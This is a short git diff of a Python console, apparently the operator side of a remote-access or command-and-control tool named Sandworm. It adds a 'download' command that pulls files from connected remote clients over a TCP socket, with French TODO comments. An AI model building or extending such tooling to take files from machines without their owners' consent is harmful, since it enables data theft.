@@ -1,4 +1,5 @@
 import cmd
+from colorama import Fore, Style
 
 class SandwormCLI(cmd.Cmd):
     """
@@ -59,20 +60,23 @@ class SandwormCLI(cmd.Cmd):
         Usage: download <remote_file_path>
         """
 
+        # TODO : Ajouter un local file path
         if not file_path:
             print("Usage: download <remote_file_path>")
             return
         
-        # TODO : envoyer la commande de download et effectuer le transfert
-        # Ces lignes ci-dessous sont temporaires, mais un bon début
-        # (Ca envoie la command download au client)
-        self.sandworm["socket"].send(f"DOWNLOAD {file_path}".encode() + b"\n")
+        answer = input(f"Download {file_path} locally? (y/n) :")
+        answer = answer.lower()
         print(f"Requested file '{file_path}' from sandworm [{self.index}]")
+        if answer == "y" or answer == "yes":
+            tcp_server = self.parent_cli.tcp_listeners[self.sandworm["tcp_index"]][0]
+            success = tcp_server.download_remote_file(self.sandworm["socket"], file_path)
 
-        # Appelle la fonction de tcp server qui permet de download
-        # (elle existe pas tu vas devoir l'écrire)
-        # Attends que ca soit terminer avant de revenir ici et de
-        # demander une nouvelle commande
+            if success:
+                print(Fore.GREEN + f"Successfully downloaded {file_path} locally." + Style.RESET_ALL)
+
+            else:
+                print(Fore.RED + f"Error downloading {file_path} locally.." + Style.RESET_ALL)
 
         return
 
